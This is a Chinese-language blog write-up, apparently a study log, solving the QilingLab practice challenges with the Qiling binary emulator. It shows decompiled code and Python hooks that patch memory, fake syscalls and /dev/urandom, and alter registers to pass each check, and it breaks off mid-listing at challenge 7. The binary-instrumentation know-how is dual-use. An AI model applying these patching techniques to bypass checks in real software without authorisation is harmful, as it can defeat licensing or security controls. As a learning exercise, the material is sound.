src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426182719013.png" alt="image-20220426182719013"></p><h3 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h3><p><a href="https://bbs.pediy.com/thread-268989.htm">https://bbs.pediy.com/thread-268989.htm</a></p><p>显示找不到registry 文件夹</p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220413170526016.png" alt="image-20220413170526016">解决方案： 需要查看 “ Important note on Windows DLLs and registry “ 这一章节window 依赖</p><p>在运行的时候会报错</p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220413170458755.png" alt="image-20220413170458755"></p><p>解决方案： python3.8以上</p><h4 id="challenge1-writeup"><a href="#challenge1-writeup" class="headerlink" title="challenge1 writeup"></a>challenge1 writeup</h4><p>程序尝试读取0x1337 处未映射的内存，因此，为了通过这个检查，我们只需要映射这虚拟内存区域并写入期望值。</p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220414153151724.png" alt="image-20220414153151724"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># Cross Platform and Multi Architecture Advanced Binary Emulation Framework</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">import</span> sys<br>sys.path.append(<span class="hljs-string">&quot;..&quot;</span>)<br><br><span class="hljs-keyword">from</span> qiling <span class="hljs-keyword">import</span> Qiling<br><span class="hljs-keyword">from</span> qiling.const <span class="hljs-keyword">import</span> QL_VERBOSE<br><br><span class="hljs-comment"># </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge1</span>(<span class="hljs-params">ql:Qiling</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1111111&quot;</span>+<span class="hljs-built_in">str</span>(ql.mem.is_mapped(<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x1000</span>)))<br>ql.mem.<span class="hljs-built_in">map</span>(<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x1000</span>,info=<span class="hljs-string">&#x27;[challenge1]&#x27;</span>)<br>ql.mem.write(<span class="hljs-number">0x1337</span>,ql.pack16(<span class="hljs-number">1337</span>)) <span class="hljs-comment"># pack16(value) == struct.pack(&#x27;H&#x27;,value)</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#ql = Qiling([&quot;rootfs/x8664_linux/qilinglab-x86_64&quot;], &quot;rootfs/x8664_linux&quot;, verbose=QL_VERBOSE.DEFAULT)</span><br>    ql = Qiling([<span class="hljs-string">&quot;rootfs/x8664_linux/qilinglab-x86_64&quot;</span>], <span class="hljs-string">&quot;rootfs/x8664_linux&quot;</span>)<br>    challenge1(ql)<br>    ql.verbose = <span class="hljs-number">1</span> <span class="hljs-comment"># 设置输出信息的详细级别</span><br>    ql.mem.show_mapinfo() <span class="hljs-comment"># 显示完整的内存映射来查看我们刚刚映射的区域</span><br>    ql.run()<br></code></pre></td></tr></table></figure><p>为啥要ql.mem.map(0x1000,0x1000) ,因为我们要修改的内存地址是0x1337。</p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220414140014259.png" alt="image-20220414140014259"></p><p>主要收获</p><blockquote><p>ql.mem.write(0x1337,ql.pack16(1337)) 修改内存地址上的值。</p></blockquote><h4 id="challenge2-writeup"><a href="#challenge2-writeup" class="headerlink" title="challenge2 writeup"></a>challenge2 writeup</h4><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs smali">nsigned __int64 __fastcall challenge2(_BYTE *a1)<br>&#123;<br>  unsigned<span class="hljs-built_in"> int </span>v2; // [rsp+10h] [rbp-1D0h]<br> <span class="hljs-built_in"> int </span>v3; // [rsp+14h] [rbp-1CCh]<br> <span class="hljs-built_in"> int </span>v4; // [rsp+18h] [rbp-1C8h]<br> <span class="hljs-built_in"> int </span>v5; // [rsp+1Ch] [rbp-1C4h]<br>  struct utsname name; // [rsp+20h] [rbp-1C0h] BYREF<br>  char s[10]; // [rsp+1A6h] [rbp-3Ah] BYREF<br>  char v8[24]; // [rsp+1B0h] [rbp-30h] BYREF<br>  unsigned __int64 v9; // [rsp+1C8h] [rbp-18h]<br><br>  v9 = __readfsqword(0x28u);<br> <span class="hljs-built_in"> if </span>( uname(&amp;name) )<br>  &#123;<br>    perror(<span class="hljs-string">&quot;uname&quot;</span>);<br>  &#125;<br>  else<br>  &#123;<br>    strcpy(s, <span class="hljs-string">&quot;QilingOS&quot;</span>);<br>    strcpy(v8, <span class="hljs-string">&quot;ChallengeStart&quot;</span>);<br>    v2 = 0;<br>    v3 = 0;<br>    while ( v4 &lt; strlen(s) )<br>    &#123;<br>     <span class="hljs-built_in"> if </span>( name.sysname[v4] == s[v4] )<br>        ++v2;<br>      ++v4;<br>    &#125;<br>    while ( v5 &lt; strlen(v8) )<br>    &#123;<br>     <span class="hljs-built_in"> if </span>( name.version[v5] == v8[v5] )<br>        ++v3;<br>      ++v5;<br>    &#125;<br>   <span class="hljs-built_in"> if </span>( v2 == strlen(s) &amp;&amp; v3 == strlen(v8) &amp;&amp; v2 &gt; 5 )<br>      *a1 = 1;<br>  &#125;<br> <span class="hljs-built_in"> return </span>__readfsqword(0x28u) ^ v9;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到utsname 结构体</p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220414160121966.png" alt="image-20220414160121966"></p><p>根据前面反汇编出来的代码可以看到，函数调用了系统调用uname函数来获取有关底层操作系统的信息，uname 函数会获取ustname 结构体的指针，为了通过检查，ustname 结构体中的sysname 参数必须是 ”QilingOS“，而version 参数必须是” ChallengeStart”。</p><p>我们可以在uname 函数返回之前，使用Qiling API 进行hook 系统调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_uname_on_exit</span>(<span class="hljs-params">ql: Qiling, *args</span>):<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:0000000000000BD8                 lea     rax, [rbp+name]</span><br><span class="hljs-string">.text:0000000000000BDF                 mov     rdi, rax        ; name</span><br><span class="hljs-string">.text:0000000000000BE2                 call    _uname</span><br><span class="hljs-string">.text:0000000000000BE7                 test    eax, eax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>rdi = ql.arch.regs.rdi <span class="hljs-comment"># 控制寄存器</span><br>ql.mem.write(rdi, <span class="hljs-string">b&#x27;QilingOS\x00&#x27;</span>)<br>ql.mem.write(rdi + <span class="hljs-number">65</span> * <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;ChallengeStart\x00&#x27;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge2</span>(<span class="hljs-params">ql:Qiling</span>):<br>ql.os.set_syscall(<span class="hljs-string">&#x27;uname&#x27;</span>, hook_uname_on_exit, QL_INTERCEPT.EXIT)<br></code></pre></td></tr></table></figure><blockquote><p>os_set_syscall()</p><p><a href="https://docs.qiling.io/en/latest/hijack/">https://docs.qiling.io/en/latest/hijack/</a></p></blockquote><h4 id="challenge3-writeup"><a href="#challenge3-writeup" class="headerlink" title="challenge3 writeup"></a>challenge3 writeup</h4><p>根据函数，我们可以看到两个问题，</p><p>一个是从&#x2F;dev&#x2F;urandom 得到随机数，然后和gerandom 获取的随机数要一样。</p><p>从&#x2F;dev&#x2F;urandom 获取的第一个随机数要和其他的不一样</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs inform7">unsigned __int64 __fastcall challenge3(_BYTE *a1)<br>&#123;<br>  int v2; // <span class="hljs-comment">[rsp+10h]</span> <span class="hljs-comment">[rbp-60h]</span><br>  int i; // <span class="hljs-comment">[rsp+14h]</span> <span class="hljs-comment">[rbp-5Ch]</span><br>  int fd; // <span class="hljs-comment">[rsp+18h]</span> <span class="hljs-comment">[rbp-58h]</span><br>  char v5; // <span class="hljs-comment">[rsp+1Fh]</span> <span class="hljs-comment">[rbp-51h]</span> BYREF<br>  char buf<span class="hljs-comment">[32]</span>; // <span class="hljs-comment">[rsp+20h]</span> <span class="hljs-comment">[rbp-50h]</span> BYREF<br>  char v7<span class="hljs-comment">[40]</span>; // <span class="hljs-comment">[rsp+40h]</span> <span class="hljs-comment">[rbp-30h]</span> BYREF<br>  unsigned __int64 v8; // <span class="hljs-comment">[rsp+68h]</span> <span class="hljs-comment">[rbp-8h]</span><br><br>  v8 = __readfsqword(0x28u);<br>  fd = <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, 0);<br>  read(fd, buf, 0x20uLL);<br>  read(fd, &amp;v5, 1uLL);<br>  close(fd);<br>  getrandom(v7, 32LL, 1LL);<br>  v2 = 0;<br>  for ( i = 0; i &lt;= 31; ++i )<br>  &#123;<br>    if ( buf<span class="hljs-comment">[i]</span> == v7<span class="hljs-comment">[i]</span> &amp;&amp; buf<span class="hljs-comment">[i]</span> != v5 )<br>      ++v2;<br>  &#125;<br>  if ( v2 == 32 )<br>    *a1 = 1;<br>  return __readfsqword(0x28u) ^ v8;<br>&#125;<br></code></pre></td></tr></table></figure><p>hook</p><p>hook 的思路：使用set_syscall 来劫持系统调用的函数getrandom,让getrandom 函数全部返回00字节。这个和challenge2 劫持不一样，而是整个的覆盖这个函数。</p><p>然后使用add_fs_mapper 函数与 QlFsMappedObject 一起自定义文件系统&#x2F;dev&#x2F;urandom，让urandom 再请求多个字节时返回00字节，再请求一个字节时返回不同的字节。</p><blockquote><p>。</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from qiling.os.mapper import <span class="hljs-title class_">QlFsMappedObject</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake</span>_urandom(<span class="hljs-title class_">QlFsMappedObject</span>):<br><span class="hljs-comment"># Fake read fs operation</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, size</span>):<br><span class="hljs-keyword">if</span> size == <span class="hljs-number">1</span>:<br><span class="hljs-keyword">return</span> b<span class="hljs-string">&quot;\x41&quot;</span><br><span class="hljs-keyword">return</span> b<span class="hljs-string">&quot;\x00&quot;</span>*size<br><span class="hljs-comment"># Fake close fs operation</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getrandom_hook</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span>, buf, buflen, flags, *args</span>):<br>ql.mem.write(buf,b<span class="hljs-string">&quot;\x00&quot;</span>*buflen)<br>ql.os.set_syscall_return(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge3</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span></span>):<br>ql.os.set_syscall(<span class="hljs-string">&quot;getrandom&quot;</span>, getrandom_hook)<br>ql.add_fs_mapper(<span class="hljs-string">&quot;/dev/urandom&quot;</span>,<span class="hljs-title class_">Fake</span>_urandom())<br></code></pre></td></tr></table></figure><p>主要收获：</p><blockquote><p>ql.add_fs_mapper()  fs 映射器，可以讲读&#x2F;写操作重定向到用户自定义的对象</p></blockquote><h4 id="challenge4-writeup"><a href="#challenge4-writeup" class="headerlink" title="challenge4 writeup"></a>challenge4 writeup</h4><p>使用IDA 无法显示反汇编的代码，但是通过汇编不难看出这是一个循环。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">:<span class="hljs-number">0000000000000E1</span>D <span class="hljs-comment">; Attributes: bp-based frame</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>D<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>D                 public challenge4<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>D challenge4      proc near               <span class="hljs-comment">; CODE XREF: start+18F↓p</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>D<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>D var_18          = qword ptr <span class="hljs-number">-18</span>h<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>D var_8           = dword ptr <span class="hljs-number">-8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>D var_4           = dword ptr <span class="hljs-number">-4</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>D<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>D <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>D                 <span class="hljs-keyword">push</span>    rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E1</span>E                 <span class="hljs-keyword">mov</span>     rbp, rsp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E21</span>                 <span class="hljs-keyword">mov</span>     [rbp+var_18], rdi<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E25</span>                 <span class="hljs-keyword">mov</span>     [rbp+var_8], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E2</span>C                 <span class="hljs-keyword">mov</span>     [rbp+var_4], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E33</span>                 <span class="hljs-keyword">jmp</span>     short loc_E40<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E35</span> <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E35</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E35</span> loc_E35:                                <span class="hljs-comment">; CODE XREF: challenge4+29↓j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E35</span>                 <span class="hljs-keyword">mov</span>     rax, [rbp+var_18]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E39</span>                 <span class="hljs-keyword">mov</span>     byte ptr [rax], <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E3</span>C                 <span class="hljs-keyword">add</span>     [rbp+var_4], <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E40</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E40</span> loc_E40:                                <span class="hljs-comment">; CODE XREF: challenge4+16↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E40</span>                 <span class="hljs-keyword">mov</span>     eax, [rbp+var_8]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E43</span>                 cmp     [rbp+var_4], eax   <span class="hljs-meta"># hook eax 寄存器内的值为 1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E46</span>                 jl      short loc_E35<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E48</span>                 <span class="hljs-keyword">nop</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E49</span>                 <span class="hljs-keyword">pop</span>     rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E4</span>A                 retn<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E4</span>A <span class="hljs-comment">; &#125; // starts at E1D</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000E4</span>A challenge4      endp<br><br>void challenge4(char *check) &#123;<br>    int i<span class="hljs-comment">;</span><br>    i = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    while (i &lt; <span class="hljs-number">0</span>) &#123;<br>        *check = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>        i = i + <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需要hook eax寄存器里的值为1 ，这样var4 就会小于1.从而改变程序的运行流程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">enter_forbidden_loop_hook</span>(<span class="hljs-params">ql:Qiling</span>):<br>ql.arch.regs.eax =<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge4</span>(<span class="hljs-params">ql:Qiling</span>):<br><span class="hljs-built_in">print</span>(ql.path)<br><span class="hljs-comment"># get_lib_base need the real filename which is qilinglab-x86_64</span><br><span class="hljs-comment"># 获取真实的文件的路径</span><br>base_addr = ql.mem.get_lib_base(os.path.split(ql.path)[-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(base_addr)<br><span class="hljs-comment"># Address we need to patch</span><br>test_forbidden_loop_enter =base_addr+ <span class="hljs-number">0xE43</span><br><span class="hljs-comment"># Place hook</span><br>ql.hook_address(enter_forbidden_loop_hook, test_forbidden_loop_enter)<br></code></pre></td></tr></table></figure><p>主要收获： 修改某个指令中的寄存器的值。</p><blockquote><p>hook_address(callback，address)  hook 特定的地址</p><p>get_lib_base(filename) 获取文件的基址</p></blockquote><h4 id="challenge5-writeup"><a href="#challenge5-writeup" class="headerlink" title="challenge5 writeup"></a>challenge5 writeup</h4><p>这个函数要求，所有从rand函数出来的值都要相等。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">unsigned __int64 __fastcall challenge5(_BYTE *a1)<br>&#123;<br>  unsigned<span class="hljs-built_in"> int </span>v1; // eax<br> <span class="hljs-built_in"> int </span>i; // [rsp+18h] [rbp-48h]<br> <span class="hljs-built_in"> int </span>j; // [rsp+1Ch] [rbp-44h]<br> <span class="hljs-built_in"> int </span>v5[14]; // [rsp+20h] [rbp-40h]<br>  unsigned __int64 v6; // [rsp+58h] [rbp-8h]<br><br>  v6 = __readfsqword(0x28u);<br>  v1 = time(0<span class="hljs-class">LL);</span><br>  srand(v1);<br>  for ( i = 0; i &lt;= 4; ++i )<br>  &#123;<br>    v5[i] = 0;<br>    v5[i + 8] = rand();<br>  &#125;<br>  for ( j = 0; j &lt;= 4; ++j )<br>  &#123;<br>   <span class="hljs-built_in"> if </span>( v5[j] != v5[j + 8] )<br>    &#123;<br>      *a1 = 0;<br>     <span class="hljs-built_in"> return </span>__readfsqword(0x28u) ^ v6;<br>    &#125;<br>  &#125;<br>  *a1 = 1;<br> <span class="hljs-built_in"> return </span>__readfsqword(0x28u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>只要每次让rand() 每次返回0 就可以。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_rand</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span></span>):<br>ql.arch.regs.rax = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge5</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span></span>):<br>ql.os.set_api(<span class="hljs-string">&#x27;rand&#x27;</span>,hook_rand)<br><br></code></pre></td></tr></table></figure><p>主要收获：</p><blockquote><p>rax 寄存器主要作为函数返回值使用。因此直接hook rand 函数返回值传入的寄存器rax 即可。</p><p>os.set_api()  主要用于windows API 函数的hook</p></blockquote><h4 id="challenge6-writeup"><a href="#challenge6-writeup" class="headerlink" title="challenge6 writeup"></a>challenge6 writeup</h4><p>死循环</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">void challenge6(void)<br><br>&#123;<br>  <span class="hljs-built_in">do</span> &#123;<br>  &#125; while( true )<span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">.text:</span>0000000000000F12                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_5]<br><span class="hljs-symbol">.text:</span>0000000000000F16                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">al</span>, <span class="hljs-built_in">al</span>  # 修改<span class="hljs-built_in">rax</span> 寄存器的值<br><span class="hljs-symbol">.text:</span>0000000000000F18                 <span class="hljs-keyword">jnz</span>     short loc_F0B<br><span class="hljs-symbol">.text:</span>0000000000000F1A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+var_18]<br><span class="hljs-symbol">.text:</span>0000000000000F1E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>只要修改死循环的部门</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">hook_while_true</span>(ql:Qiling):<br><br>ql.arch.regs.rax = <span class="hljs-number">0</span><br><br>def <span class="hljs-built_in">challenge6</span>(ql:Qiling):<br>base = ql.mem.<span class="hljs-built_in">get_lib_base</span>(<span class="hljs-string">&quot;qilinglab-x86_64&quot;</span>)<br>ql.<span class="hljs-built_in">hook_address</span>(hook_while_true,base + <span class="hljs-number">0</span>xF16)<br><br></code></pre></td></tr></table></figure><h4 id="challenge7-writeup"><a href="#challenge7-writeup" class="headerlink" title="challenge7 writeup"></a>challenge7 writeup</h4><p>这是一个sleep 的函数，challenge7 函数会返回sleep 函数，一直sleep。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0000000000000F24 challenge7      proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; CODE XREF: start+1FB↓p</span><br><span class="hljs-symbol">.text:</span>0000000000000F24<br><span class="hljs-symbol">.text:</span>0000000000000F24 var_8           = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>0000000000000F24<br><span class="hljs-symbol">.text:</span>0000000000000F24 <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>0000000000000F24                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>0000000000000F25                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span>0000000000000F28                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span>0000000000000F2C                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_8], <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span>0000000000000F30                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+var_8]<br><span class="hljs-symbol">.text:</span>0000000000000F34                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>0000000000000F37                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">0FFFFFFFFh</span> <span class="hljs-comment">; seconds</span><br><span 